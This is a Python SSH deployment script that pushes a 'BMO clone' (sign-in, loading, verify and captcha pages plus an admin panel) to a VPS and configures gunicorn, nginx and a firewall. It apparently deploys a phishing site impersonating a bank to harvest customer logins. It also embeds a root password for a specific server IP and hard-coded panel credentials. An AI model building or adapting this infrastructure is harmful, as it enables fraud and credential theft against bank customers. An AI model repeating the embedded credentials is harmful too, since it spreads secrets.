#!/usr/bin/env python3
"""One-shot deploy of the BMO clone to a fresh Ubuntu 22.04 VPS.

Usage:
    python3 deploy.py HOST [USER] [PASS]
    python3 deploy.py 23.94.145.158 root vigZNDuUoYKS9y9OhgPP

Idempotent. Safe to re-run — only changed files get pushed, service restarts.
"""
import io, sys, tarfile, pathlib, time
import paramiko

HOST = sys.argv[1] if len(sys.argv) > 1 else "23.94.145.158"
USER = sys.argv[2] if len(sys.argv) > 2 else "root"
PASS = sys.argv[3] if len(sys.argv) > 3 else "vigZNDuUoYKS9y9OhgPP"
PORT = 22

PROJECT = pathlib.Path(__file__).parent
REMOTE  = "/opt/bmo-clone"

INCLUDE = ["server", "page1-signin", "page2-loading", "page3-verify",
           "captcha.html"]
EXCLUDE_DIRS = {"__pycache__", ".git", "node_modules", "data"}

SYSTEMD_UNIT = f"""[Unit]
Description=BMO clone (Flask via gunicorn)
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory={REMOTE}/server
Environment=PYTHONUNBUFFERED=1
Environment=ADMIN_USER=admin
Environment=ADMIN_PASSWORD=Panel9100
ExecStart=/usr/local/bin/gunicorn -w 2 -b 127.0.0.1:8000 --timeout 60 --access-logfile - --error-logfile - app:app
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
"""

NGINX_SITE = """server {
    listen 80 default_server;
    server_name _;
    client_max_body_size 32m;
    access_log /var/log/nginx/bmo.access.log;
    error_log  /var/log/nginx/bmo.error.log warn;

    location / {
        proxy_pass         http://127.0.0.1:8000;
        proxy_http_version 1.1;
        proxy_set_header   Host              $host;
        proxy_set_header   X-Real-IP         $remote_addr;
        proxy_set_header   X-Forwarded-For   $proxy_add_x_forwarded_for;
        proxy_set_header   X-Forwarded-Proto $scheme;
        proxy_read_timeout 60s;
    }
}
"""

def build_tarball() -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name in INCLUDE:
            root = PROJECT / name
            if not root.exists(): continue
            if root.is_file():
                tar.add(str(root), arcname=name); continue
            for p in root.rglob("*"):
                if any(part in EXCLUDE_DIRS for part in p.parts): continue
                if p.suffix == ".pyc" or p.name == ".DS_Store": continue
                if p.is_symlink():
                    real = p.resolve()
                    if real.is_dir():
                        for sub in real.rglob("*"):
                            if sub.is_file():
                                arc = str(p.relative_to(PROJECT) / sub.relative_to(real))
                                tar.add(str(sub), arcname=arc)
                        continue
                    tar.add(str(real), arcname=str(p.relative_to(PROJECT))); continue
                if p.is_file():
                    tar.add(str(p), arcname=str(p.relative_to(PROJECT)))
    return buf.getvalue()

def main():
    print(f"[+] connecting {USER}@{HOST}:{PORT}")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASS, timeout=20, allow_agent=False, look_for_keys=False)

    def run(cmd, show=True, timeout=600):
        _, out, err = ssh.exec_command(cmd, timeout=timeout)
        o = out.read().decode(errors="replace")
        e = err.read().decode(errors="replace")
        rc = out.channel.recv_exit_status()
        if show:
            print(f"  $ {cmd[:140]}")
            if o.strip(): print("    " + o.strip().replace("\n", "\n    ")[:800])
            if rc != 0 and e.strip(): print(f"    ! rc={rc}: {e.strip()[:300]}")
        return rc, o

    # 1. system deps (idempotent)
    print("[+] apt + pip deps")
    run("DEBIAN_FRONTEND=noninteractive apt-get update -qq", timeout=120)
    run("DEBIAN_FRONTEND=noninteractive apt-get install -y -qq python3-pip nginx ufw", timeout=600)
    run("python3 -m pip install --quiet --break-system-packages flask gunicorn 2>&1 | tail -2 || "
        "python3 -m pip install --quiet flask gunicorn 2>&1 | tail -2", timeout=300)

    # 2. upload + extract (preserve data/)
    print("[+] upload project")
    tarball = build_tarball()
    print(f"    tarball {len(tarball):,} bytes")
    run(f"mkdir -p {REMOTE}/server/data")
    run(f"tar -czf /tmp/bmo-data.tar.gz -C {REMOTE}/server data 2>/dev/null; true", show=False)
    sftp = ssh.open_sftp()
    with sftp.open("/tmp/bmo-clone.tar.gz", "wb") as f:
        for i in range(0, len(tarball), 256*1024):
            f.write(tarball[i:i+256*1024])
    sftp.close()
    run(f"rm -rf {REMOTE}/page* {REMOTE}/server {REMOTE}/*.html")
    run(f"tar -xzf /tmp/bmo-clone.tar.gz -C {REMOTE} && rm /tmp/bmo-clone.tar.gz")
    run(f"tar -xzf /tmp/bmo-data.tar.gz -C {REMOTE}/server 2>/dev/null; rm -f /tmp/bmo-data.tar.gz")
    run(f"ls -la {REMOTE}/")

    # 3. systemd unit
    print("[+] systemd unit")
    sftp = ssh.open_sftp()
    rc, out = run("which gunicorn || ls /usr/local/bin/gunicorn /usr/bin/gunicorn 2>/dev/null | head -1", show=False)
    gun_path = out.strip().splitlines()[0] if out.strip() else "/usr/local/bin/gunicorn"
    unit = SYSTEMD_UNIT.replace("/usr/local/bin/gunicorn", gun_path)
    with sftp.open("/etc/systemd/system/bmo-clone.service", "w") as f:
        f.write(unit)

    # 4. nginx
    print("[+] nginx vhost")
    for p in ["/etc/nginx/sites-enabled/default", "/etc/nginx/conf.d/default.conf"]:
        try: sftp.remove(p)
        except Exception: pass
    try: pathlib.Path  # noop
    except Exception: pass
    with sftp.open("/etc/nginx/conf.d/bmo.conf", "w") as f:
        f.write(NGINX_SITE)
    # drop any legacy site from sites-enabled
    run("rm -f /etc/nginx/sites-enabled/bmo /etc/nginx/sites-enabled/bmo-clone 2>/dev/null; true", show=False)
    sftp.close()

    run("nginx -t")
    run("systemctl daemon-reload")
    run("systemctl enable --now bmo-clone.service")
    run("systemctl restart bmo-clone")
    run("systemctl restart nginx && systemctl enable nginx")

    # 5. firewall
    print("[+] ufw")
    run("ufw --force reset", show=False)
    run("ufw default deny incoming", show=False)
    run("ufw default allow outgoing", show=False)
    run("ufw allow 22/tcp", show=False)
    run("ufw allow 80/tcp", show=False)
    run("ufw --force enable", show=False)

    # 6. smoke
    print("[+] smoke")
    time.sleep(2)
    run("systemctl is-active bmo-clone nginx")
    for p in ["/", "/signin", "/verify", "/captcha", "/panel", "/api/layout"]:
        rc, out = run(f"curl -s -o /dev/null -w '{p}=%{{http_code}}' http://127.0.0.1{p}", show=False)
        print("   ", out)

    ssh.close()
    print(f"\n[+] done — http://{HOST}/")
    print(f"[+] panel  — http://{HOST}/panel  (admin / Panel9100)")

if __name__ == "__main__":
    main()
